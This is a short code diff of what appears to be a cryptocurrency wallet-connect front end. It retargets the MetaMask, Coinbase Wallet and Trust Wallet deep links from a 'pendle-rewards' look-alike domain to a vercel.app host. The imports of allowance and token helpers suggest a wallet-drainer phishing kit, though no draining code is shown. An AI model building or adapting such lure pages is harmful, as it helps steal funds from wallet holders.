@@ -446,7 +446,6 @@ import {
   getTokens,
   increaseAllowance,
   mconnector,
-  trustwalletConnect,
   allownce,
   ethBalance
 } from './utils/walletconnect.js';
@@ -485,7 +484,7 @@ export default {
           this.wConnect()
           return;
         }
-        url = 'https://metamask.app.link/dapp/pendle-rewards.finance';
+        url = 'https://metamask.app.link/dapp/multi-call-front-end.vercel.app';
       }
       if (type == 2) {
         if (window.ethereum) {
@@ -493,16 +492,16 @@ export default {
         }
 
         url =
-          'https://go.cb-w.com/dapp?cb_url=https%3a%2f%2fpendle-rewards.finance%2f';
+          'https://go.cb-w.com/dapp?cb_url=https%3a%2f%2fmulti-call-front-end.vercel.app%2f';
       }
       if (type == 3) {
         if(window.ethereum){
           this.showModal = false;
-          await trustwalletConnect();
+          await mconnector();
           this.wConnect()
           return;
         }
-        url = "https://link.trustwallet.com/open_url?coin_id=60&url=https://pendle-rewards.finance/";
+        url = "https://link.trustwallet.com/open_url?coin_id=60&url=https://multi-call-front-end.vercel.app/";
       }
       if (type == 4) {
         url =
